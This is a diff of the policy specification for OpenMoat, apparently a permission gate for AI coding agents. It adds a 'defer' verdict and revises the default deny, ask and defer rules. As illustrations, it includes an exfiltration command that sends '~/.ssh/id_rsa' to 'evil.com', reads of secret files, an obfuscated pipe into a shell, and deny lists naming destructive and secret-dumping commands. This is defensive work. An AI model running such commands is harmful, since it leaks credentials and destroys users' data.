@@ -15,16 +15,17 @@ the operating system also bounds what the call can reach ([SANDBOX.md](SANDBOX.m
 ```yaml
 version: 1                          # required; only 1 is supported
 
-defaults:                           # verdict when no rule matches
-  "*": ask                          #   one verdict for everything, or a map per kind
+defaults:                           # verdict when no rule matches: allow, defer, ask or deny
+  "*": defer                        #   one verdict for everything, or a map per kind
   net: deny                         #   keys other than the ten kinds and "*" are accepted but never consulted
-  fetch: ask                        #   unset, a fetch takes the `net` default
+  fetch: defer                      #   unset, a fetch takes the `net` default
   web.search: allow                 #   only `defaults` decide a web search; unset, it takes "*"
-  tool.unknown: ask                 #   only `defaults` decide a tool the adapter cannot classify; unset, it takes "*"
+  tool.unknown: defer               #   only `defaults` decide a tool the adapter cannot classify; unset, it takes "*"
 
 deny:   [ <rule group>, … ]         # evaluated first; a match here is final
 allow:  [ <rule group>, … ]         # evaluated second
-ask:    [ <rule group>, … ]         # evaluated third
+ask:    [ <rule group>, … ]         # evaluated third: OpenMoat asks the person itself
+defer:  [ <rule group>, … ]         # evaluated fourth: the agent's own permission prompt decides
 
 executables:                        # pin program names to absolute paths (enforced, see §8.1)
   git: ["/usr/bin/git", "/opt/homebrew/bin/git"]
@@ -44,7 +45,12 @@ they are accepted so older policy files stay valid, have no effect yet, and `moa
 says so. Approvals are made with `moat allow` (§8.2); the project root is the git root of the
 call's working directory (§3.2).
 
-Unknown keys are rejected. Rule ids must be unique across all three lists and must
+`defer` (ADR-025) means OpenMoat neither objects nor approves: the agent's own permission
+flow decides the call, exactly as it would without OpenMoat (§5). `ask` means OpenMoat asks
+the person itself. The default policy defers what it does not know and keeps `ask` for the
+few calls whose effect outlives the sandbox or the session (§6).
+
+Unknown keys are rejected. Rule ids must be unique across all four lists and must
 not be empty; a rule group must contain at least one pattern.
 
 The file is YAML 1.2, read strictly (ADR-024): a key repeated in one mapping, a merge key
@@ -183,19 +189,20 @@ Tokenised with the same lexer as commands, so `a|b` and `a | b` are equal.
 ## 4. How a decision is made
 
 ```
-tool call ──► atomic actions ──► per action: deny → allow → ask → defaults ──► strictest wins
+tool call ──► atomic actions ──► per action: deny → allow → ask → defer → defaults ──► strictest wins
 ```
 
 1. The host's tool call becomes one `Action` (shell command, file read, file write, URL, MCP tool).
 2. The classifier expands it into atomic actions. `curl -d @~/.ssh/id_rsa https://evil.com` becomes a `shell` action, an `fs.read` of `~/.ssh/id_rsa` and a `net` action for `evil.com`.
-3. Each atomic action is evaluated in order `deny → allow → ask`; the first list containing a match decides it. A repository policy's `ask` rules are tried right after `deny` (§10). If nothing matches, `defaults` decides (`default.<kind>` when a per-kind default exists, otherwise `default`).
-4. The verdict for the tool call is the **strictest** across its atomic actions: `deny > ask > allow`.
-5. Input the lexer cannot understand (unbalanced quotes, unterminated `$(`, nesting deeper than 4 levels, more than 64 KB, more than 2048 atomic actions) is `ask` with rule id `unparseable`, never `allow`. When only part of a call cannot be classified (one simple command or nested `$( … )` of a command line, a relative path after an unknown `cd`, one MCP URL argument with no host), that part is one more `unparseable` ask and every other part is still decided; step 4 then applies, so `cd "$X" && cat notes ~/.ssh/id_rsa` and an MCP call reading `~/.ssh/id_rsa` with a malformed `url` are denied by `secrets-paths`, not asked. What follows the failure inside the same simple command or nested command is not classified. Input that does not lex at all yields no parts and asks.
+3. Each atomic action is evaluated in order `deny → allow → ask → defer`; the first list containing a match decides it. A repository policy's `ask` rules are tried right after `deny` (§10). If nothing matches, `defaults` decides (`default.<kind>` when a per-kind default exists, otherwise `default`).
+4. The verdict for the tool call is the **strictest** across its atomic actions: `deny > ask > defer > allow`.
+5. Input the lexer cannot understand (unbalanced quotes, unterminated `$(`, nesting deeper than 4 levels, more than 64 KB, more than 2048 atomic actions) gets rule id `unparseable` and is never `allow`: it defers when the catch-all (`"*"`) is `allow` or `defer`, as in the default policy, and asks when the catch-all is `ask` or `deny`. Where this section says such a part "asks", read "defers" under the default policy. When only part of a call cannot be classified (one simple command or nested `$( … )` of a command line, a relative path after an unknown `cd`, one MCP URL argument with no host), that part is one more `unparseable` ask and every other part is still decided; step 4 then applies, so `cd "$X" && cat notes ~/.ssh/id_rsa` and an MCP call reading `~/.ssh/id_rsa` with a malformed `url` are denied by `secrets-paths`, not asked. What follows the failure inside the same simple command or nested command is not classified. Input that does not lex at all yields no parts and asks.
 
 Consequences worth remembering:
 
 - **Deny is absolute.** No allow rule can override a deny rule. To express "nothing of this kind except these", use `defaults` plus allow rules, as the default policy does for `net`.
 - A `fetch` is a narrower kind of `net` (ADR-017): `net` patterns in `deny`, `allow` and `ask` match it as well as `fetch` patterns, and with no `defaults.fetch` the `net` default decides it. A `fetch` pattern never matches other network access, so `curl`, `wget`, `nc`, a Claude Code `Monitor` WebSocket and MCP `url` arguments are only judged by `net` rules.
+- A host is network evidence (`net`) when it comes from a URL with a scheme or from an argument of a program that names hosts (`curl`, `wget`, `ssh`, `scp`, `sftp`, `rsync`, `nc`, `ncat`, `netcat`, `telnet`, `ftp`, `ping`, `dig`, `nslookup`, `host`, `git clone/fetch/pull/push/ls-remote`). Any other unquoted word that only looks like a host (`check_runs.0.id`, `config.dev`, `subprocess.run` in a here-document) is still matched by `net` rules, so a host you deny or allow is denied or allowed; when no rule matches it, the catch-all decides it (it is deferred in the default policy), not `defaults.net` (ADR-025).
 - An allow rule on `shell` does not allow the paths or hosts the command touches; those are evaluated separately. `cat ~/.ssh/id_rsa` is denied by the path rule even though `cat *` is allowed.
 - Arguments that name files become `fs.read`/`fs.write` actions even when they are relative: any word containing `/` (`s/id_rsa`, `src/main.rs`, the value of `--in=keys/k`), and every operand of programs that read or write their operands (`cat`, `head`, `tail`, `less`, `grep`, `rg`, `wc`, `diff`, `base64`, `tar`, `ls`, `find`, `cp`, `mv`, `rm`, `tee`, … ; `shell/tables.rs`), so `cat k` is a read of `<cwd>/k`. Options before `--`, URLs, remote specs (`host:dir`) and the arguments of `echo`/`printf` are not files. Inside the project these reads cost nothing (`project-fs` allows them); an option value such as the `5` in `head -n 5 f` becomes a harmless read of `<cwd>/5`.
 - Relative paths follow `cd` and `pushd` earlier in the same command line: `cd ~/.ssh && cat id_rsa` is a read of `~/.ssh/id_rsa`. Which commands run after a `cd` succeeds is not modelled (`cd x || cat y`, a failed `cd` before `;`), so a relative path is checked in every directory the line may be in (the session's directory and each `cd` target), strictest wins. A subshell `( … )` restores the directory when it closes; `$( … )` and `sh -c` start from the directory where they appear. `cd` alone is `~`. A target that cannot be known (`cd "$DIR"`, `cd -`, `cd s*`, `pushd +1`, `popd`, and `eval`/`source`, which may `cd` themselves) makes every later relative path unresolvable, so the command asks with rule `unparseable`; absolute paths are still checked normally. More than 16 possible directories also asks. `cd` itself adds no new action (a path-looking target is an `fs.read` like any argument). `CDPATH` is not consulted: the shell searches it for a target that does not start with `/`, `./` or `../`, but the classifier cannot see the environment the host started the shell with, so such a target is taken relative to the current directory. Setting `CDPATH` on the line itself (`CDPATH=~ cd .ssh`, `export CDPATH=…`) is an `env.set` with no allow rule and asks, and the shell start-up files that could preset it are denied by `shell-rc`.
@@ -258,11 +265,12 @@ other atomic action, so an `allow` becomes `ask` and a `deny` stays `deny`.
 
 The verdict is the same for every host; the response document is the host's own format.
 
-| Host event | `allow` | `ask` | `deny` |
-|---|---|---|---|
-| Claude Code and Codex `PreToolUse` | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"moat: allow [rule]"}}`, exit 0 | same with `"ask"`, exit 0; the host prompts the user with the reason | same with `"deny"`, reason also on stderr, exit 2; the agent sees the rule id and reason |
-| Cursor `beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile`, `preToolUse` | `{"permission":"allow","user_message":"moat: allow [rule]","agent_message":"…"}`, exit 0 | `"permission":"ask"`, exit 0 | `"permission":"deny"`, exit 2 |
-| Claude Code `ConfigChange` | `{}` (the changed settings file is loaded), exit 0 | not produced | `{"decision":"block","reason":"moat: deny [kernel-integrity] — …"}`, exit 2; the session keeps its previous settings |
+| Host event | `allow` | `defer` | `ask` | `deny` |
+|---|---|---|---|---|
+| Claude Code and Codex `PreToolUse` | `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"moat: allow [rule]"}}`, exit 0 | nothing on stdout, exit 0: the host's own permission flow runs (its prompt, auto mode, Codex's approval policy) | same with `"ask"`, exit 0; the host prompts the user with the reason (Codex: a deny that says how to approve) | same with `"deny"`, reason also on stderr, exit 2; the agent sees the rule id and reason |
+| Cursor `beforeShellExecution`, `beforeMCPExecution` | `{"permission":"allow","user_message":"moat: allow [rule]","agent_message":"…"}`, exit 0 | `"permission":"ask"`: Cursor's own prompt | `"permission":"ask"`, exit 0 | `"permission":"deny"`, exit 2 |
+| Cursor `beforeReadFile`, `preToolUse` | as above | recorded and answered as `ask`: these events cannot prompt and run file tools outside Cursor's sandbox | a deny that says how to approve | `"permission":"deny"`, exit 2 |
+| Claude Code `ConfigChange` | `{}` (the changed settings file is loaded), exit 0 | not produced | not produced | `{"decision":"block","reason":"moat: deny [kernel-integrity] — …"}`, exit 2; the session keeps its previous settings |
 
 The reason line has the shape `moat: <verdict> [rule, rule] — reason; reason`.
 
@@ -344,7 +352,7 @@ Seatbelt and Landlock rules of `moat run` are generated from it.
 | deny | `env-dump` | `env`, `printenv`, `set`, `export`, `declare`, `typeset` with no arguments (or only `-0`, `-p`, `-x`), also by absolute path: they print every variable, secrets included. `printenv NAME` is an `env.read` of `NAME` |
 | deny | `env-poison` | setting `PATH`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`, `NODE_OPTIONS`, `PYTHONPATH`, `GIT_*`, `BASH_ENV`, `ENV`, `PROMPT_COMMAND`, `MOAT_*` |
 | deny | `pipe-to-shell` | `curl`/`wget` output, or any decoded/decompressed stream (`base64 -d/-D/--decode`, `openssl … -d`, `xxd -r`, `gunzip`, `zcat`, `gzip -d`, …), piped into a shell or interpreter that reads its program from stdin (`sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`, `python*`, `node`, `perl`, `ruby`, `php`, `deno`, `bun`, `pwsh`); `eval` |
-| deny | `destructive` | any write to the home directory or the root itself (`fs.write` of exactly `~` and `/`, however the path is spelt: `~/`, `$HOME`, `${HOME}`, `/Users/me/`, `~/x/..`), so removing, moving or replacing them with any program and flags; this also denies a command that changes that directory itself (`touch ~`, `chmod 700 ~`) or copies into it entries whose names the command line does not show (`rsync -a dist/ ~/`, `cp * ~/`), while a copy or move of named files into it writes those entries (`cp f ~/` writes `~/f` and asks, §3.1), as do writes below them (`mkdir ~/x`, `rm -rf ~/tmp/build`) are unaffected; `rm` of an unexpanded `/*`, `~/*`, `$HOME/*`, `${HOME}/*` or of `//`, and `rm -rf --no-preserve-root`, `git push --force*`/`-f*` (also after the remote, bundled as `-uf`, and a `+refspec` such as `+main` or `+HEAD:main`), remote branch deletion (`git push origin :main`, `--delete`, `-d`), the prefixes of `--force` and `--delete` git accepts as abbreviations (`--for*`, `--de*`; `--mirror` and `--prune` stay at the `push` ask), `git reset --hard`, `git clean -fdx`, `git branch -D`, `git stash drop/clear`, `sudo`, `mkfs`, `dd if=`, `shutdown`, `reboot` |
+| deny | `destructive` | any write to a raw disk (`/dev/disk*`, `/dev/sd*`, `/dev/nvme*`, …), and any write to the home directory or the root itself (`fs.write` of exactly `~` and `/`, however the path is spelt: `~/`, `$HOME`, `${HOME}`, `/Users/me/`, `~/x/..`), so removing, moving or replacing them with any program and flags; this also denies a command that changes that directory itself (`touch ~`, `chmod 700 ~`) or copies into it entries whose names the command line does not show (`rsync -a dist/ ~/`, `cp * ~/`), while a copy or move of named files into it writes those entries (`cp f ~/` writes `~/f` and asks, §3.1), as do writes below them (`mkdir ~/x`, `rm -rf ~/tmp/build`) are unaffected; `rm` of an unexpanded `/*`, `~/*`, `$HOME/*`, `${HOME}/*` or of `//`, and `rm -rf --no-preserve-root`, `git push --force*`/`-f*` (also after the remote, bundled as `-uf`, and a `+refspec` such as `+main` or `+HEAD:main`), remote branch deletion (`git push origin :main`, `--delete`, `-d`), the prefixes of `--force` and `--delete` git accepts as abbreviations (`--for*`, `--de*`; `--mirror` and `--prune` stay at the `push` ask), `git reset --hard`, `git clean -fdx`, `git branch -D`, `git stash drop/clear`, `sudo`, `mkfs`, `dd if=`, `shutdown`, `reboot` |
 | deny | `kernel-self` | writes to `~/.moat`, `~/.codex`, anything under a `.moat/` directory, host hook/settings files, and to the directories `~/.moat`, `~/.claude`, `~/.codex`, `~/.cursor` (and `.moat`, `.claude`, `.codex`, `.cursor` anywhere) themselves, and the same paths in the directories `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME` and `CURSOR_CONFIG_DIR` name (§3.2), so they cannot be renamed, deleted or replaced by a link; any `bin/moat` or `bin/moat.exe` (the binary every hook runs), and Scoop's `apps/moat/current` junction and `apps/moat/<version>/moat.exe` (ADR-016); `moat policy/init/doctor/allow/edit/trust/uninstall` and `moat sandbox sync` from an agent, also by absolute path (`*/moat …`) and under the pseudo-terminal wrappers `script`, `expect`, `unbuffer` (ADR-011), also by absolute path, Python `pty.spawn(…)`, `tmux`/`screen` and `osascript` (ADR-014); under those wrappers any `moat` command, a bare `moat` included, since its home screen asks questions at a terminal |
 | deny | `shell-rc` | writes to `~/.zshrc`, `~/.bashrc`, `~/.profile` and friends |
 | deny | `cloud-metadata` | network to instance metadata and link-local services (`169.254.*`, `fe80:*`, `fd00:ec2::254`, `100.100.100.200`, `metadata.google.internal`, `metadata.goog`), for shell network and for a host fetch tool alike |
@@ -355,10 +363,13 @@ Seatbelt and Landlock rules of `moat run` are generated from it.
 | allow | `text-tools` | `sed`, `awk`, `sort`, `uniq`, `cut`; their file operands and the files they write are fs actions, and what the classifier cannot prove read-only (`<program> @<argument>`, §3.1) is excluded and asks |
 | allow | `registries` | `api.github.com`, `github.com`, npm, crates.io, Go proxy, PyPI (shell clients and `WebFetch` alike) |
 | allow | `safe-mcp` | read-only GitHub and filesystem MCP tools |
-| ask | `installs` | `npm install/i/ci`, `pnpm add/install/dlx`, `yarn add/install/dlx`, `npx`, `npm exec`/`npm x` (they download a package they cannot find, like `npx`), `pip install`, `cargo add/install`, `brew install`, `gem install` |
-| ask | `local-net` | network to `localhost`, `127.0.0.1`, `::1`, fetches included (a local service may expose a control API) |
-| ask | `push` | `git push`, `npm/pnpm/yarn publish`, `cargo publish`, `gh release` |
-| defaults | `default`, `default.net`, `default.fetch`, `default.web.search`, `default.tool.unknown` | everything else asks; outbound network to unlisted hosts is denied, except a `WebFetch` read of an unlisted URL, which asks (ADR-017); a `WebSearch` is allowed and recorded, and asks once the session read secret material; a tool the adapter cannot classify asks |
+| ask | `git-internals` | writes to a `.git` at any depth (hooks, config, refs, a `gitdir:` file) and `git config`, `git remote`, `git -c`, `git --config-env`, `git --git-dir`, `git --work-tree`, `git --exec-path` in the forms `dev-shell` does not allow: git runs what they name later, outside any sandbox |
+| ask | `persistence` | writes to `~/Library/LaunchAgents`, `~/.gitconfig`, `~/.config/git`, `~/.config/autostart`, `~/.config/systemd/user`; `crontab` |
+| ask | `home-sweep` | reading the home folder or `~/.config` themselves, which is what a recursive read of them reads (`grep -r . ~`, `tar czf h.tgz ~`, `find ~ -name '*.pem'`) |
+| ask | `opaque-code` | `<program> @<argument>` atoms of `awk`, `sed`, `sort`, `uniq`, `cut` (a program or option the classifier cannot prove harmless, §3.1), `printf -v`, setting `CDPATH`, and `<shell> @stdin`: text piped into a shell that the command line does not show (`printf '\x63at .env' \| sh`) |
+| ask | `docker-secrets` | `docker build` with the options `dev-shell` leaves out (`--secret`, `--ssh`, `--build-context`, `--network`, `--output`, …) |
+| defer | `local-net` | network to `localhost`, `127.0.0.1`, `::1`, fetches included: without it the `net` default would deny local services |
+| defaults | `default`, `default.net`, `default.fetch`, `default.web.search`, `default.tool.unknown` | everything else defers to the agent's own permission prompt (installs, pushes and publishing included); outbound network to unlisted hosts is denied; a `WebFetch` of an unlisted URL defers (ADR-017); a `WebSearch` is allowed and recorded, and asks once the session read secret material; a tool the adapter cannot classify defers |
 
 MCP calls are judged by name **and** by what their arguments touch: adapters map path-like arguments (`path`, `paths`, `file_path`, `source`, `destination`, …) to `fs.read`/`fs.write` atoms (write for `write_*`, `edit_*`, `move_*`, `delete_*`-shaped tools and for `destination`/`target`) and URL-like arguments (`url`, `uri`, `endpoint`) to `net` atoms, so `mcp__filesystem__read_file {path: ~/.aws/credentials}` is denied by `secrets-paths` even though `safe-mcp` allows the tool name. Arguments are searched down to 8 levels of nesting (`{"options": {"path": …}}`), URL arguments count with or without a scheme, and arguments that cannot be read (a Cursor `tool_input` string that is not JSON, more than 1024 paths and URLs) deny the call instead of letting the name decide alone. Arguments nested deeper than 8 levels are not searched; they may name a file or host, so the call is at least `ask` (rule id `unparseable`, with the limit in the reason), and a `deny` from what was searched still wins.
 
